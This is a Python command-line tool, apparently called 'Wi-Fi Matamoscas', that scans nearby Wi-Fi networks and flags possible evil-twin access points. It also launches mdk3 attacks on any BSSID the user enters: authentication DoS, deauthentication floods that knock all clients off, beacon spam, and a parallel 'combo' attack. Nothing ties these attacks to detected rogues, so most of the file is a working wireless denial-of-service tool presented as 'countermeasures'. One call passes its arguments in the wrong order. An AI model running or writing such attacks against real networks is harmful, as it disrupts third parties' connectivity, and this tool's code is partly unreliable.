import subprocess
import threading
import time
import signal
import os
import sys
import shutil
from collections import defaultdict
import subprocess 

PROHIBITED_WORDS = ["free", "gratis", "openwifi", "libre", "guest"]
REQUIRED_BINARIES = ["airmon-ng", "airodump-ng", "mdk3", "iwgetid", "iw"]

ASCII_ART = r"""
 _______  _______ _________ _______  _______  _______  _______  _______  _______  _______ 
(       )(  ___  )\__   __/(  ___  )(       )(  ___  )(  ____ \(  ____ \(  ___  )(  ____ \
| () () || (   ) |   ) (   | (   ) || () () || (   ) || (    \/| (    \/| (   ) || (    \/
| || || || (___) |   | |   | (___) || || || || |   | || (_____ | |      | (___) || (_____ 
| |(_)| ||  ___  |   | |   |  ___  || |(_)| || |   | |(_____  )| |      |  ___  |(_____  )
| |   | || (   ) |   | |   | (   ) || |   | || |   | |      ) || |      | (   ) |      ) |
| )   ( || )   ( |   | |   | )   ( || )   ( || (___) |/\____) || (____/\| )   ( |/\____) |
|/     \||/     \|   )_(   |/     \||/     \|(_______)\_______)(_______/|/     \|\_______)
                                                                                          
"""

def check_dependencies():
    missing = [cmd for cmd in REQUIRED_BINARIES if shutil.which(cmd) is None]
    if missing:
        print("\n[!] Missing required dependencies:")
        for cmd in missing:
            print(f"  - {cmd}")
        print("\nPlease install them with:")
        print("  sudo apt update && sudo apt install -y " + " ".join(missing))
        sys.exit(1)

def list_interfaces():
    result = subprocess.run(["iw", "dev"], capture_output=True, text=True)
    interfaces = []
    for line in result.stdout.splitlines():
        if "Interface" in line:
            interfaces.append(line.strip().split()[-1])
    return interfaces

def choose_interface():
    interfaces = list_interfaces()
    if not interfaces:
        print("[!] No wireless interfaces found.")
        sys.exit(1)
    print("\nAvailable network interfaces:")
    for i, iface in enumerate(interfaces):
        print(f"  [{i}] {iface}")
    choice = input("\nChoose interface number: ")
    try:
        index = int(choice)
        return interfaces[index]
    except:
        print("[!] Invalid choice.")
        sys.exit(1)

def enable_monitor_mode(interface):
    print("[*] Killing conflicting processes (wpa_supplicant, NetworkManager)...")
    subprocess.run(["airmon-ng", "check", "kill"], check=True)

    print(f"[*] Enabling monitor mode on {interface}...")
    before = set(list_interfaces())
    subprocess.run(["airmon-ng", "start", interface], check=True)
    time.sleep(2)  # give the system a moment

    after = set(list_interfaces())
    new_ifaces = after - before
    if new_ifaces:
        mon_iface = new_ifaces.pop()
        print(f"[+] Monitor mode enabled: {mon_iface}")
        return mon_iface
    else:
        print(f"[+] Monitor mode likely enabled on the same interface: {interface}")
        return interface

def disable_monitor_mode(mon_iface):
    subprocess.run(["airmon-ng", "stop", mon_iface])

def scan_networks(mon_iface):
    print("[*] Scanning Wi-Fi networks...")
    proc = subprocess.Popen([
        "airodump-ng", mon_iface,
        "--write-interval", "1", "-w", "/tmp/scan", "--output-format", "csv"
    ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    try:
        time.sleep(15)
    finally:
        proc.terminate()
        proc.wait()
    return "/tmp/scan-01.csv"

def list_all_networks(csv_path):
    ssid_map = defaultdict(list)
    with open(csv_path, "r", encoding="utf-8", errors="ignore") as f:
        content = f.read()

    print("\nAvailable Access Points:")
    for line in content.splitlines():
        if len(line.strip()) == 0 or "BSSID" in line:
            continue
        fields = line.split(",")
        if len(fields) > 13:
            bssid = fields[0].strip()
            channel = fields[3].strip()
            pwr = fields[8].strip()
            enc = fields[5].strip()
            ssid = fields[13].strip()
            ssid_map[ssid].append(bssid)
            print(f"[{channel}] {bssid} | Power: {pwr} | Encryption: {enc} | SSID: {ssid}")

    print("\n[!] SSIDs with multiple BSSIDs:")
    for ssid, bssids in ssid_map.items():
        if ssid and len(bssids) > 1:
            print(f"  - SSID '{ssid}' has {len(bssids)} BSSIDs: {', '.join(bssids)}")

def parse_csv_for_rogues(csv_path, legit_ssid, mon_iface):
    with open(csv_path, "r", encoding="utf-8", errors="ignore") as f:
        content = f.read()
    rogues = []
    current_channel = subprocess.getoutput(f"iw dev {mon_iface} info | grep channel | awk '{{print $2}}'").strip()
    for line in content.splitlines():
        if len(line.strip()) == 0 or "BSSID" in line:
            continue
        fields = line.split(",")
        if len(fields) > 13:
            bssid = fields[0].strip()
            channel = fields[3].strip()
            ssid = fields[13].strip().lower()
            has_prohibited_word = any(word in ssid for word in PROHIBITED_WORDS)
            is_fake_ssid = ssid == legit_ssid.lower()
            different_channel = channel != "" and channel != current_channel
            if has_prohibited_word or (is_fake_ssid and different_channel):
                rogues.append((bssid, channel, ssid, is_fake_ssid, has_prohibited_word))
    return rogues

def attack_ap(bssid, channel, mon_iface, mode="a", duration=20):
    print(f"[!] Attacking AP: {bssid} on channel {channel} (mode {mode})")
    print("[*] Mode legend:")
    print("    a: Authentication DoS")
    print("    d: Deauthentication flood")
    print("    m: Michael MIC DoS")
    print("    x: 802.1x DoS")
    print("    w: WPA flooding\n")
    proc = subprocess.Popen(["mdk3", mon_iface, mode, "-a", bssid, "-c", channel])
    time.sleep(duration)
    proc.terminate()
    print("[+] Attack finished.")

def full_combo_attack(mon_iface, bssid, channel, duration=20):
    print(f"[+] Launching Full DoS Combo Attack for {duration} seconds") 
    processes = [] 
    def run_attack(mode, label):
        print(f"    [{label}] Starting {mode} attack...")
        proc = subprocess.Popen(["mdk3", mon_iface, mode, "-a", bssid, "-c", channel],
                                stdout=subprocess.DEVNULL,
                                stderr=subprocess.DEVNULL,
                                preexec_fn=os.setsid)  # Needed to terminate group later
        processes.append(proc) 
    # Launch attacks in parallel threads
    threads = [
        threading.Thread(target=run_attack, args=("d", "a")),  # Deauth
        threading.Thread(target=run_attack, args=("b", "b")),  # Beacon spam
        threading.Thread(target=run_attack, args=("p", "x"))   # Probe request
    ] 
    for t in threads:
        t.start()
    for t in threads:
        t.join() 
    print(f"[+] Combo attack running... waiting {duration} seconds")
    time.sleep(duration) 
    print("[*] Time's up. Stopping all attacks...")
    for proc in processes:
        try:
            os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
        except Exception as e:
            print(f"    [!] Failed to terminate process: {e}")
    print("[+] All attack processes stopped.")

def disconnect_clients(mon_iface, bssid, channel):
    print(f"[!] Launching deauth flood on AP {bssid} (channel {channel})")
    subprocess.Popen(["mdk3", mon_iface, "d", "-a", bssid, "-c", channel])
    print("[*] Press Ctrl+C to stop when done. This attack will continue running.")

def cleanup(mon_iface, orig_iface):
    print("[*] Cleaning up...")
    subprocess.run(["airmon-ng", "stop", mon_iface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(["service", "NetworkManager", "start"])
    subprocess.run(["service", "wpa_supplicant", "start"])
    print(f"[*] Interface {orig_iface} set back to managed mode.")

def menu():
    print(ASCII_ART)
    print("Wi-Fi Matamoscas - Evil Twin & Rogue AP Detector")
    print("A tool to scan for Wi-Fi networks, detect rogue APs, and launch countermeasures.\n")
    print("Available actions:")
    print("  [1] List all nearby Wi-Fi networks")
    print("  [2] Scan for rogue APs using known SSID")
    print("  [3] Attack a specific AP")
    print("  [4] Full combo attack AP x3 (abx)")
    print("  [5] Disable monitor mode")
    print("  [6] Disconnect all clients from an AP (Deauth Flood)")
    print("  [0] Exit")
    

def main():
    check_dependencies()
    menu()
    iface = choose_interface()
    mon_iface = enable_monitor_mode(iface)
    try:
        while True:
            menu()
            choice = input("\nSelect an option: ")
            if choice == "1":
                csv = scan_networks(mon_iface)
                list_all_networks(csv)
            elif choice == "2":
                legit_ssid = input("Enter the known good SSID: ")
                csv = scan_networks(mon_iface)
                rogues = parse_csv_for_rogues(csv, legit_ssid, mon_iface)
                if rogues:
                    for bssid, channel, ssid, is_fake, is_prohibited in rogues:
                        print(f"[!] Detected: SSID={ssid} BSSID={bssid} Channel={channel}")
                        if is_fake:
                            print("  [!] Possible Evil Twin")
                        if is_prohibited:
                            print("  [!] Suspicious SSID keywords")
                else:
                    print("[*] No suspicious APs detected.")
            elif choice == "3":
                bssid = input("Enter BSSID to attack: ")
                channel = input("Enter channel: ")
                mode = input("Enter attack mode a, d, m, x, w (default: a): ") or "a"
                try:
                    duration = int(input("Duration in seconds (default: 20): ") or 20)
                except ValueError:
                    duration = 20
                attack_ap(bssid, channel, mon_iface, mode, duration)
            elif choice == "4":
                bssid = input("Enter BSSID to attack: ")
                channel = input("Enter channel: ") 
                try:
                    duration = int(input("Duration in seconds (default: 20): ") or 20)
                except ValueError:
                    duration = 20
                full_combo_attack(bssid, channel, mon_iface, duration)
            elif choice == "5":
                disable_monitor_mode(mon_iface)
                print("[*] Monitor mode disabled.")
            elif choice == "6":
                bssid = input("Enter BSSID to disconnect clients from: ")
                channel = input("Enter channel: ")
                disconnect_clients(mon_iface, bssid, channel)
            elif choice == "0":
                break
            else:
                print("[!] Invalid option.")
    finally:
        cleanup(mon_iface, iface)
        print("[*] Monitor mode disabled and cleanup done.")

if __name__ == "__main__":
    main()
